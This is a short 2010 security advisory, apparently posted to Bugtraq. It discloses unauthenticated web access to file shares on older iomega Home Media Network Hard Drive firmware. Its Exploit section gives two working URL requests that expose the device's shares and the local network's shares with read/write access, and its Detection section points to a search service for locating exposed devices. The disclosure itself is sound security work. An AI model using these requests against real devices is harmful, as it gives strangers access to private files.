@@ -1,0 +1,56 @@
+-----------------------------
+Advisory
+-----------------------------
+Unauthenticated File-system Access in iomega Home Media Network Hard Drive
+
+-----------------------------
+Affected products
+-----------------------------
+iomega Home Media Network Hard Drive Firmware versions 2.038 - 2.061
+
+-----------------------------
+Timeline
+-----------------------------
+04.13.2010 - Discovered, disclosed to Bugtraq.
+
+-----------------------------
+Disclosure
+-----------------------------
+Full. Not disclosed to vendor due to latest firmware not being vulnerable.
+
+-----------------------------
+Details
+-----------------------------
+iomega chose to use smbwebclient to allow users of its product to
+access files shared by the device via their web browser. However,
+smbwebclient is in an unprotected directory allowing access without
+authentication. smbwebclient grants the user full browser-based
+read/write access to any visible shares on the device itself OR the
+rest of the device's local network (assuming the shares' permissions
+grant said access).
+
+-----------------------------
+Exploit
+-----------------------------
+View shares on device:
+http://[DEVICE IP OR HOSTNAME]/cgi-bin/smbwebclient.php?path=WORKGROUP%2F[DEVICE NAME]
+(Device name is found in title of webpage on root directory of device)
+
+View all shares on device's local network:
+http://[DEVICE IP OR HOSTNAME]/cgi-bin/smbwebclient.php
+
+-----------------------------
+Detection
+-----------------------------
+51 results returned in the following search on
+ERIPP:http://eripp.com/?ipdb=1&search="Iomega"&sort=time&order=DESC&limit=20&submitbutton=Search
+
+If device displays a slideshow on the root (home) page it is generally
+firmware version 2.063 and is not vulnerable.
+
+-----------------------------
+References
+-----------------------------
+http://go.iomega.com/en-us/products/network-storage-desktop/home-network-hard-drives/home-media/?partner=4760
+http://smbwebclient.sourceforge.net/2005/02/version-22.html
+http://eripp.com/
